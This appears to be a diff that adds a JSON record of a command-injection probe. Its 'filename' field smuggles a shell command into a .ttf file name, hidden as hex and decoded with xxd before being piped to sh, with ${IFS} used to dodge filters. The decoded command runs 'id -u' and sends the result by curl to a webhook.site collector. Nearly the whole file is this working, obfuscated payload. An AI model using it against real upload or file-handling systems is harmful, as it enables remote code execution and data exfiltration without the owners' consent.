@@ -1,0 +1,7 @@
+{
+  "case": "574050907",
+  "receiver": "https://webhook.site/bd5e60d6-27a2-4643-b048-d03b3e8fed9f",
+  "query": "fp1",
+  "decoded_payload": "id -u|curl -m5 -d@- https://webhook.site/bd5e60d6-27a2-4643-b048-d03b3e8fed9f?x=fp1",
+  "filename": "C.ttf;echo${IFS}6964202d757c6375726c202d6d35202d64402d2068747470733a2f2f776562686f6f6b2e736974652f62643565363064362d323761322d343634332d623034382d6430336233653866656439663f783d667031|xxd${IFS}-r${IFS}-p|sh;#.ttf"
+}
